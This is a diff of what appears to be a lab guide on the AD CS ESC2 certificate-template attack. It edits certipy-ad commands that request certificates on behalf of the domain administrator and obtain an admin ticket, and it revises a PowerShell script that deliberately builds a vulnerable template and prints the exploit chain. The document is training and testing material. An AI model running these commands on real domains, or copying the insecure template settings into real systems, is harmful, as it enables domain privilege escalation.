@@ -65,18 +65,31 @@ If the template ALSO has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, exploit exactly li
 
 ```powershell
 # Request certificate with admin UPN
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'VulnESC2' \
-    -upn 'administrator@certificate.local' \
-    -ldap-scheme ldap
+certipy-ad req \ 
+  -u 'test@certificate.local' -p 'sako2005!' \
+  -dc-ip 192.168.0.150 \
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'VulnESC2' \
+  -subject 'CN=test' \
+  -ldap-scheme ldap
 
-# Authenticate and get NT Hash
+# Create Test.pfx
+certipy-ad req \ 
+  -u 'test@certificate.local' -p 'sako2005!' \
+  -dc-ip 192.168.0.150 \
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'User' \
+  -on-behalf-of 'certificate\administrator' \
+  -pfx test.pfx \
+  -ldap-scheme ldap
+
+# Request Administrator TGT
 certipy-ad auth \
-    -pfx administrator.pfx \
-    -dc-ip 192.168.0.150
+  -pfx administrator.pfx \
+  -dc-ip 192.168.0.150 \
+  -domain certificate.local
 ```
 
 ---
@@ -183,24 +196,24 @@ evil-winrm -i 10.10.10.10 -u administrator -H NTHash
     For authorized lab/testing use only.
 #>
 
-# ── Config ────────────────────────────────────────────────────────────────────
+# -- Config --------------------------------------------------------------------
 
 $TemplateName = "VulnESC2"
 $TemplateOID  = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.200"
 $EnrollGroup  = "Domain Users"
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# -- Helpers -------------------------------------------------------------------
 
 function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
 function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
 function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
 function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
 
-# ── Preflight ─────────────────────────────────────────────────────────────────
+# -- Preflight -----------------------------------------------------------------
 
 Write-Host ""
 Write-Host "  ESC2 Lab Setup" -ForegroundColor Magenta
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
 
 Write-Step "Checking environment..."
@@ -214,7 +227,7 @@ try {
     exit 1
 }
 
-# ── Cleanup existing ──────────────────────────────────────────────────────────
+# -- Cleanup existing ----------------------------------------------------------
 
 $existing = Get-ADObject -Filter { Name -eq "VulnESC2" } -SearchBase $templatePath -ErrorAction SilentlyContinue
 
@@ -223,9 +236,11 @@ if ($existing) {
     try {
         certutil -SetCATemplates -VulnESC2 2>$null | Out-Null
     } catch {}
+    Start-Sleep -Seconds 2
     try {
         Remove-ADObject "CN=VulnESC2,$templatePath" -Confirm:$false -ErrorAction Stop
         Write-Ok "Old template removed."
+        Start-Sleep -Seconds 2
     } catch {
         Write-Fail "Could not remove old template: $_"
         Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC2Lab.ps1"
@@ -233,29 +248,39 @@ if ($existing) {
     }
 }
 
-# ── Create template ───────────────────────────────────────────────────────────
+# -- Create template -----------------------------------------------------------
 
 Write-Step "Creating vulnerable certificate template: $TemplateName"
+
+# FIX 1: msPKI-Certificate-Name-Flag = 1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
+#         Original was 0 - caused empty subject and CERTSRV_E_BAD_REQUESTSUBJECT error.
+#
+# FIX 2: pKIKeyUsage = @(0xA0, 0x00) - DigitalSignature + KeyEncipherment only
+#         Original 0x86 included KeyCertSign bit which marked template as sub-CA
+#         and conflicted with pKIMaxIssuingDepth=0.
+#
+# FIX 3: flags = 131072 (0x20000)
+#         Original 131104 broke subject name processing in some environments.
 
 $attrs = @{
     "displayName"                          = $TemplateName
     "msPKI-Cert-Template-OID"              = $TemplateOID
-    "msPKI-Certificate-Name-Flag"          = 0          # No CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (key ESC2 difference)
-    "msPKI-Enrollment-Flag"                = 0          # No manager approval
+    "msPKI-Certificate-Name-Flag"          = 1
+    "msPKI-Enrollment-Flag"                = 0
     "msPKI-Minimal-Key-Size"               = 2048
-    "msPKI-Private-Key-Flag"               = 16         # Exportable private key
-    "msPKI-RA-Signature"                   = 0          # No authorized signature required
+    "msPKI-Private-Key-Flag"               = 16
+    "msPKI-RA-Signature"                   = 0
     "msPKI-Template-Schema-Version"        = 2
     "msPKI-Template-Minor-Revision"        = 0
-    "msPKI-Certificate-Application-Policy" = "2.5.29.37.0"   # Any Purpose OID
-    "pKIExtendedKeyUsage"                  = "2.5.29.37.0"   # Any Purpose OID
+    "msPKI-Certificate-Application-Policy" = "2.5.29.37.0"
+    "pKIExtendedKeyUsage"                  = "2.5.29.37.0"
     "pKIDefaultKeySpec"                    = 1
     "pKIMaxIssuingDepth"                   = 0
-    "pKIKeyUsage"                          = [byte[]]@(0x86, 0x00)   # DigitalSignature + KeyEncipherment + KeyCertSign
+    "pKIKeyUsage"                          = [byte[]]@(0xA0, 0x00)
     "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
-    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)  # 1 year
-    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)  # 6 weeks
-    "flags"                                = 131104
+    "pKIExpirationPeriod"                  = [byte[]]@(0x00, 0x40, 0x39, 0x87, 0x2e, 0x2b, 0xfe, 0xff)
+    "pKIOverlapPeriod"                     = [byte[]]@(0x00, 0x80, 0xa6, 0x0a, 0xff, 0xff, 0xff, 0xff)
+    "flags"                                = 131072
     "revision"                             = 100
 }
 
@@ -272,26 +297,35 @@ try {
     exit 1
 }
 
-# ── Set ACL ───────────────────────────────────────────────────────────────────
+# -- Set ACL -------------------------------------------------------------------
 
-Write-Step "Granting Enroll permission to '$EnrollGroup'..."
+Write-Step "Granting Enroll + AutoEnroll permissions to '$EnrollGroup'..."
 
 try {
-    $acl  = Get-Acl "AD:\CN=$TemplateName,$templatePath"
-    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-        [System.Security.Principal.NTAccount]$EnrollGroup,
-        "ExtendedRight",
-        "Allow"
+    $templateDN     = "AD:\CN=$TemplateName,$templatePath"
+    $acl            = Get-Acl $templateDN
+    $principal      = [System.Security.Principal.NTAccount]$EnrollGroup
+
+    $enrollGuid     = [Guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
+    $ruleEnroll     = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $principal, "ExtendedRight", "Allow", $enrollGuid, "None", [Guid]::Empty
     )
-    $acl.AddAccessRule($rule)
-    Set-Acl -Path "AD:\CN=$TemplateName,$templatePath" -AclObject $acl -ErrorAction Stop
-    Write-Ok "Enroll permission granted to '$EnrollGroup'."
+    $acl.AddAccessRule($ruleEnroll)
+
+    $autoEnrollGuid = [Guid]"a05b8cc2-17bc-4802-a710-e7c15ab866a2"
+    $ruleAuto       = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+        $principal, "ExtendedRight", "Allow", $autoEnrollGuid, "None", [Guid]::Empty
+    )
+    $acl.AddAccessRule($ruleAuto)
+
+    Set-Acl -Path $templateDN -AclObject $acl -ErrorAction Stop
+    Write-Ok "Enroll + AutoEnroll permissions granted to '$EnrollGroup'."
 } catch {
     Write-Fail "Failed to set ACL: $_"
     exit 1
 }
 
-# ── Add to CA ─────────────────────────────────────────────────────────────────
+# -- Add to CA -----------------------------------------------------------------
 
 Write-Step "Adding template to CA..."
 
@@ -309,46 +343,69 @@ if ($LASTEXITCODE -eq 0) {
     }
 }
 
-# ── Restart CertSvc ───────────────────────────────────────────────────────────
+# -- Verify template attributes ------------------------------------------------
+
+Write-Step "Verifying template attributes..."
+
+try {
+    $obj        = Get-ADObject "CN=$TemplateName,$templatePath" -Properties * -ErrorAction Stop
+    $nameFlag   = $obj.'msPKI-Certificate-Name-Flag'
+    $enrollFlag = $obj.'msPKI-Enrollment-Flag'
+    $eku        = $obj.'pKIExtendedKeyUsage'
+
+    Write-Ok "msPKI-Certificate-Name-Flag : $nameFlag  (expected: 1)"
+    Write-Ok "msPKI-Enrollment-Flag       : $enrollFlag (expected: 0)"
+    Write-Ok "pKIExtendedKeyUsage         : $eku"
+
+    if ($nameFlag -ne 1) {
+        Write-Warn "msPKI-Certificate-Name-Flag is not 1 - subject supply may fail!"
+    }
+    if ($eku -notcontains "2.5.29.37.0") {
+        Write-Warn "Any Purpose OID not found in pKIExtendedKeyUsage!"
+    }
+} catch {
+    Write-Warn "Could not verify template: $_"
+}
+
+# -- Restart CertSvc -----------------------------------------------------------
 
 Write-Step "Restarting CertSvc..."
 Restart-Service -Name CertSvc -Force
 Start-Sleep -Seconds 5
 Write-Ok "CertSvc restarted."
 
-# ── Summary ───────────────────────────────────────────────────────────────────
+# -- Summary -------------------------------------------------------------------
+
+$domain = (Get-ADDomain).DNSRoot
+$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress
 
 Write-Host ""
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host "  ESC2 Lab Ready" -ForegroundColor Green
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
 Write-Host "  Template         : $TemplateName" -ForegroundColor White
 Write-Host "  EKU              : Any Purpose (2.5.29.37.0)" -ForegroundColor White
-Write-Host "  Enrollee SAN     : NOT required (sub-CA path)" -ForegroundColor White
+Write-Host "  Enrollee Subject : Required (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)" -ForegroundColor White
 Write-Host "  Manager Approval : Disabled" -ForegroundColor White
 Write-Host "  RA Signature     : 0" -ForegroundColor White
 Write-Host ""
 Write-Host "  Exploit (from Kali):" -ForegroundColor Yellow
 Write-Host ""
-
-$domain = (Get-ADDomain).DNSRoot
-$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress
-
-Write-Host "  # Step 1 — Get Any Purpose cert as low-priv user" -ForegroundColor DarkGray
-Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
+Write-Host "  # Step 1 - Get Any Purpose cert as low-priv user" -ForegroundColor DarkGray
+Write-Host "  certipy-ad req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
 Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
 Write-Host "      -ca '<CA-NAME>' -template '$TemplateName' \`" -ForegroundColor Cyan
-Write-Host "      -ldap-scheme ldap" -ForegroundColor Cyan
+Write-Host "      -subject 'CN=lowuser' -ldap-scheme ldap" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 2 — Use cert to enroll on behalf of Domain Admin" -ForegroundColor DarkGray
-Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
+Write-Host "  # Step 2 - Use cert to enroll on behalf of Domain Admin" -ForegroundColor DarkGray
+Write-Host "  certipy-ad req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
 Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
 Write-Host "      -ca '<CA-NAME>' -template 'User' \`" -ForegroundColor Cyan
 Write-Host "      -on-behalf-of '$($domain.Split('.')[0])\administrator' \`" -ForegroundColor Cyan
 Write-Host "      -pfx lowuser.pfx -ldap-scheme ldap" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 3 — Authenticate" -ForegroundColor DarkGray
-Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
+Write-Host "  # Step 3 - Authenticate as Domain Admin" -ForegroundColor DarkGray
+Write-Host "  certipy-ad auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
 Write-Host ""
 ```
